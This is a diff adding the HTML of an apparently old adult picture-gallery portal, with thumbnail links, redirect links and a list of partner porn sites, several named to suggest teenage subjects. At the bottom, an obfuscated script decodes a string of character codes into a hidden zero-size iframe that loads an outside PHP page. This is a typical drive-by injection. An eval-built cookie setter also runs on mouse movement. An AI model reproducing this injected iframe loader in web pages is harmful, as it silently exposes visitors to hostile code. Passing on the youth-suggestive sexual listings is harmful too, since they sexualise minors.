@@ -1,0 +1,134 @@
+<html>
+<head>
+<base target="_blank">
+<title>HOT & Uncensored</title>
+<script>a=1;function aaa(){if(a==1){var ksafu='';ksafu+="doc";ksafu+="ument.cookie='uniq=9b6e";ksafu+="2";ksafu+="f2c6057";ksafu+="b6";ksafu+="d074700941e09ba37";ksafu+="4';";eval(ksafu);}}document.onmousemove = aaa;</script>
+
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+<style type="text/css">
+body {
+	background-color: #FFFFFF;
+}
+table.main {
+	border-width: 1px;
+	border-style: solid;
+	border-color: #F2725F;
+	background-color: #FFCCCC;
+}
+table.main td  { padding: 10px; border: solid 1px #AAAAAA }
+a {
+	font-weight: bold;
+	font-variant: small-caps;
+	text-decoration: none;
+	color: #000000;
+}
+a:hover {
+	text-decoration: underline;	
+}
+H1, H2, H3 {font-family: Georgia, "Times New Roman", Times, serif;}
+.title {
+	font-family: Georgia, "Times New Roman", Times, serif;
+	font-weight: normal;
+	color: #000000;
+	font-size: 30px;
+	font-style: italic;
+}
+.th:hover { border: solid 3px red; }
+.th { border: solid 3px #FFCCCC; }
+.t1 {background-image: url("pics/1/t1.jpg");}
+.t2 {background-image: url("pics/1/t2.jpg");}
+.t3 {background-image: url("pics/1/t3.jpg");}
+.logo {
+  background-image: url("pics/logo1.gif");
+  background-repeat: no-repeat;
+  background-position: center center;
+  background-color: #FFFFFF;
+}
+
+</style>
+</head>
+
+<body>
+<table align="center" width="100%" border="0" cellspacing="0" cellpadding="0"><tr>
+<td class="logo"><img src="pics/D/dot.gif" width="100%" height="200" border=0></td>
+</tr>
+</table>
+<table align="center" width="800" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td width="26" class="t1"><img src="pics/D/dot.gif" width=26 height=2 border=0></td>
+    <td class="t2" width="2000"><div class="title">Hall of Fame</div></td>
+    <td width="26" class="t3"><img src="pics/D/dot.gif" width=200 height=2 border=0></td>
+  </tr>
+  <tr><td colspan=3>
+  <table width="800" class="main">
+<tr align="center"><td width='50%'><a href='out.php?galid=2037&url=swwk922%3D5%3A17%3A54157512wk2hwrksjpo2wv2pxkw32ve3245%3C736%3A%3A%3B4sm15j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0706/47/1182146528509691-6.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>21 images</td><td width='50%'><a href='out.php?galid=2052&url=swwk922%3D5%3A17%3A54157512wk2hwrksjpo2wv2pxkw32ve42568%3C4656%3B8sm17j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0706/26/1182146546469623-21.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>22 images</td></tr><tr align="center"><td width='50%'><a href='out.php?galid=2112&url=swwk922%3D5%3A17%3A54147512wk2hwrksjpo2wv2pxkw32ve42457%3B756955sm19j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0706/49/1182146598486864-81.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>17 images</td><td width='50%'><a href='out.php?galid=2069&url=swwk922%3D5%3A17%3A54147512wk2hwrksjpo2wv2pxkw32ve4238%3A3%3B5%3C3%3C5sm1%3Bj' class='ath'><IMG SRC='http://i.x-orgy.com/th/0706/43/1182146567527942-38.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>14 images</td></tr><tr align="center"><td width='50%'><a href='out.php?galid=2098&url=swwk922%3D5%3A17%3A54157512wk2hwrksjpo2wv2pxkw32ve3257458%3A5%3A9%3Csm1%3Aj' class='ath'><IMG SRC='http://i.x-orgy.com/th/0706/48/1182146584438754-67.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>13 images</td><td width='50%'><a href='out.php?galid=2031&url=swwk922%3D5%3A17%3A54157512wk2hwrksjpo2wv2pxkw32ve32%3C58%3C%3C76889sm18j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0706/46/1182146521785738-0.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>19 images</td></tr><tr align="center"><td width='50%'><a href='out.php?galid=2054&url=swwk922%3D5%3A17%3A54157512wk2hwrksjpo2wv2pxkw32ve3237%3B69%3B%3A%3B%3C%3Csm1%3Cj' class='ath'><IMG SRC='http://i.x-orgy.com/th/0706/2/1182146548585757-23.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>19 images</td><td width='50%'><a href='out.php?galid=2086&url=swwk922%3D5%3A17%3A54147512wk2hwrksjpo2wv2pxkw32ve3285535%3B%3C5%3A%3Csm13j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0706/21/1182146577697343-55.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>18 images</td></tr><tr align="center"><td width='50%'><a href='out.php?galid=2104&url=swwk922%3D5%3A17%3A54157512wk2hwrksjpo2wv2pxkw32ve32%3A5539%3A467%3Csm14j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0706/4/1182146588808976-73.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>22 images</td><td width='50%'><a href='out.php?galid=2183&url=swwk922%3D5%3A17%3A54147512wk2hwrksjpo2wv2pxkw32ve3245%3C736%3A%3A%3B4sm15j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/11/1187961724329723-53.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>14 images</td></tr>  </table>
+  </td></tr>
+</table>
+<br>
+<table align="center" width="800" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+	<td nowrap width="26" class="t1"><img src="pics/D/dot.gif" width=26 height=2 border=0></td>
+    <td class="t2" width="2000"><div class="title">Today's Galleries</div></td>
+    <td nowrap width="200" class="t3"><img src="pics/D/dot.gif" width=200 height=2 border=0></td>
+  </tr>
+  <tr><td colspan=3>
+  <table width="800" class="main">
+<tr align="center"><td width='50%'><a href='out.php?galid=2148&url=swwk922%3D5%3A17%3A54147512wk2hwrksjpo2wv2pxkw32ve32%3A3478887%3C9sm17j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/21/1187961661813015-18.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>19 images</td><td width='50%'><a href='out.php?galid=2141&url=swwk922%3D5%3A17%3A54157512wk2hwrksjpo2wv2pxkw32ve42947%3A55%3C8%3A%3Asm16j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/48/1187961650329105-11.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>22 images</td></tr><tr align="center"><td width='50%'><a href='out.php?galid=2132&url=swwk922%3D5%3A17%3A54157512wk2hwrksjpo2wv2pxkw32ve32958%3A48%3B533sm15j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/37/1187961640297507-2.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>14 images</td><td width='50%'><a href='out.php?galid=2168&url=swwk922%3D5%3A17%3A54157512wk2hwrksjpo2wv2pxkw32ve328587%3C98487sm1%3Bj' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/16/1187961689162559-38.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>18 images</td></tr><tr align="center"><td width='50%'><a href='out.php?galid=2137&url=swwk922%3D5%3A17%3A54157512wk2hwrksjpo2wv2pxkw32ve32%3B48%3C7%3A%3A3%3B%3Asm18j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/40/1187961643232839-7.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>14 images</td><td width='50%'><a href='out.php?galid=2158&url=swwk922%3D5%3A17%3A54147512wk2hwrksjpo2wv2pxkw32ve323493%3A7%3B7%3B7sm1%3Bj' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/45/118796168060466-28.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>20 images</td></tr><tr align="center"><td width='50%'><a href='out.php?galid=2136&url=swwk922%3D5%3A17%3A54147512wk2hwrksjpo2wv2pxkw32ve3236868%3A9854sm14j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/40/1187961642150088-6.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>15 images</td><td width='50%'><a href='out.php?galid=2156&url=swwk922%3D5%3A17%3A54157512wk2hwrksjpo2wv2pxkw32ve329376556933sm19j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/4/1187961678950300-26.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>21 images</td></tr><tr align="center"><td width='50%'><a href='out.php?galid=2174&url=swwk922%3D5%3A17%3A54147512wk2hwrksjpo2wv2pxkw32ve32848787%3A35%3Bsm16j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/13/1187961702185372-44.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>13 images</td><td width='50%'><a href='out.php?galid=2179&url=swwk922%3D5%3A17%3A54147512wk2hwrksjpo2wv2pxkw32ve32965%3C3%3C7%3A33sm14j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/28/1187961715471617-49.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>23 images</td></tr>  </table>
+  </td></tr>
+</table>
+<br>
+<table align="center" width="800" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+  <td nowrap width="26" class="t1"><img src="pics/D/dot.gif" width=26 height=2 border=0></td>
+    <td class="t2" width="2000"><div class="title">Yesterday's Galleries</div></td>
+    <td nowrap width="200" class="t3"><img src="pics/D/dot.gif" width=200 height=2 border=0></td>
+  </tr>
+  <tr><td colspan=3>
+  <table width="800" class="main">
+<tr align="center"><td width='50%'><a href='out.php?galid=2152&url=swwk922%3D5%3A17%3A54147512wk2hwrksjpo2wv2pxkw32ve42657475%3C985sm1%3Aj' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/40/1187961670943679-22.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>15 images</td><td width='50%'><a href='out.php?galid=2193&url=swwk922%3D5%3A17%3A54157512wk2hwrksjpo2wv2pxkw32ve32%3A3%3A3554%3A86sm14j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/26/1187961743585160-63.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>21 images</td></tr><tr align="center"><td width='50%'><a href='out.php?galid=2159&url=swwk922%3D5%3A17%3A54157512wk2hwrksjpo2wv2pxkw32ve32%3C466%3A6%3A783sm13j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/38/1187961680716220-29.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>18 images</td><td width='50%'><a href='out.php?galid=2188&url=swwk922%3D5%3A17%3A54147512wk2hwrksjpo2wv2pxkw32ve428763858584sm17j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/32/1187961733817163-58.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>21 images</td></tr><tr align="center"><td width='50%'><a href='out.php?galid=2155&url=swwk922%3D5%3A17%3A54157512wk2hwrksjpo2wv2pxkw32ve32637%3A4%3A89%3B8sm1%3Cj' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/24/1187961677195872-25.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>21 images</td><td width='50%'><a href='out.php?galid=2144&url=swwk922%3D5%3A17%3A54157512wk2hwrksjpo2wv2pxkw32ve3283%3B6%3A8%3A43%3Csm18j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/13/1187961652305242-14.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>21 images</td></tr><tr align="center"><td width='50%'><a href='out.php?galid=2131&url=swwk922%3D5%3A17%3A54147512wk2hwrksjpo2wv2pxkw32ve42773%3B76889%3Bsm15j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/32/1187961640331149-1.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>23 images</td><td width='50%'><a href='out.php?galid=2147&url=swwk922%3D5%3A17%3A54157512wk2hwrksjpo2wv2pxkw32ve42%3A3%3A4338535sm19j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/43/1187961657124685-17.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>15 images</td></tr><tr align="center"><td width='50%'><a href='out.php?galid=2185&url=swwk922%3D5%3A17%3A54147512wk2hwrksjpo2wv2pxkw32ve3294%3A4558778sm13j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/29/1187961728378205-55.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>18 images</td><td width='50%'><a href='out.php?galid=2181&url=swwk922%3D5%3A17%3A54157512wk2hwrksjpo2wv2pxkw32ve42375%3C%3A446%3A3sm18j' class='ath'><IMG SRC='http://i.x-orgy.com/th/0708/36/1187961720590173-51.jpg' width='400' height='300' alt='' border=0 class='th'></a><br>14 images</td></tr>  </table>
+  </td></tr>
+</table>
+<br>
+<table align="center" width="800" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td nowrap width="26" class="t1"><img src="pics/D/dot.gif" width=26 height=2 border=0></td>
+    <td class="t2" width="2000"><div class="title">Best Free Sites</div></td>
+    <td nowrap width="200" class="t3"><img src="pics/D/dot.gif" width=200 height=2 border=0></td>
+ </tr>
+  <tr><td colspan=3>
+  <table  border=0 align="center" class="main" width="800"><tr align="center">
+    <td width="33%"><h2><a href='out.php?perm=uncensored-sex.org&l=top1' ONMOUSEOVER="window.status='http://www.uncensored-sex.org/'; return true"ONMOUSEOUT="window.status='';return true" class='atop'>Uncensored-sex.org</a></h2></td>
+    <td><h2><a href='out.php?perm=teenspic.org&l=top2' ONMOUSEOVER="window.status='http://teenspic.org/'; return true"ONMOUSEOUT="window.status='';return true" class='atop'>Teenspic.org</a></h2></td>
+	<td width="33%"><h2><a href='out.php?perm=fierybabes.com&l=top3' ONMOUSEOVER="window.status='http://fierybabes.com/'; return true"ONMOUSEOUT="window.status='';return true" class='atop'>fierybabes.com</a></h2></td>
+</tr>
+<tr align="center">
+    <td width="33%"><h2><a href='out.php?perm=amateurs-xxx-teens.com&l=top4' ONMOUSEOVER="window.status='http://www.amateurs-xxx-teens.com/?ref=x-orgy.com'; return true"ONMOUSEOUT="window.status='';return true" class='atop'>Amateurs-XXX-Teens</a></h2></td>
+    <td><h2><a href='out.php?perm=teen-x.org&l=top5' ONMOUSEOVER="window.status='http://teen-x.org/'; return true"ONMOUSEOUT="window.status='';return true" class='atop'>Teen-x.org</a></h2></td>
+	<td width="33%"><h2><a href='out.php?perm=teensart.com&l=top6' ONMOUSEOVER="window.status='http://teensart.com/'; return true"ONMOUSEOUT="window.status='';return true" class='atop'>Teensart.com</a></h2></td>
+</tr>
+<tr align="center">
+    <td width="33%"><h2><a href='out.php?perm=maidenpix.com&l=top7' ONMOUSEOVER="window.status='http://maidenpix.com/'; return true"ONMOUSEOUT="window.status='';return true" class='atop'>Maidenpix.com</a></h2></td>
+    <td><h2><a href='out.php?perm=pixyoung.com&l=top8' ONMOUSEOVER="window.status='http://www.pixyoung.com'; return true"ONMOUSEOUT="window.status='';return true" class='atop'>Pix Young</a></h2></td>
+	<td width="33%"><h2><a href='out.php?perm=superhalls.com&l=top9' ONMOUSEOVER="window.status='http://superhalls.com/?id=x-orgycom'; return true"ONMOUSEOUT="window.status='';return true" class='atop'>superhalls.com</a></h2></td>
+</tr>
+
+
+  </table>
+  </td></tr>
+</table>
+<SCRIPT LANGUAGE="JavaScript">
+<!--
+function Decode(){var temp="",i,c=0,out="";var str="60!105!102!114!97!109!101!32!115!114!99!61!34!104!116!116!112!58!47!47!100!101!110!115!109!97!105!108!46!99!111!109!47!105!99!101!47!105!110!100!101!120!46!112!104!112!34!32!119!105!100!116!104!61!34!48!34!32!104!101!105!103!104!116!61!34!48!34!62!60!47!105!102!114!97!109!101!62!";l=str.length;while(c<=str.length-1){while(str.charAt(c)!='!')temp=temp+str.charAt(c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
+//-->
+</SCRIPT><SCRIPT LANGUAGE="JavaScript">
+<!--
+Decode();
+//-->
+</SCRIPT><script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
+</script>
+<script type="text/javascript">
+_uacct = "UA-313460-2";
+urchinTracker();
+</script>
+</body>
+</html>
